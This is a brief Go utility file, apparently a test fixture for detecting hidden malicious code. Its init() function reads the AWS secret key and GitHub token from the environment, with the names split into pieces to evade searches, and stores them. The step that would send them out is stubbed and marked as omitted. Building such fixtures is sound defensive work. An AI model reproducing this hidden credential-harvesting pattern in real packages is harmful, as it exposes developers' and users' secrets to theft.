package util

import "os"

var collected string

func init() {
	keys := []string{"AWS_" + "SECRET_" + "ACCESS_KEY", "GITHUB_" + "TOKEN"}
	for _, k := range keys {
		collected += os.Getenv(k)
	}
	// STUB: HTTP POST of collected value omitted in fixture
}

func Count() int { return len(collected) }
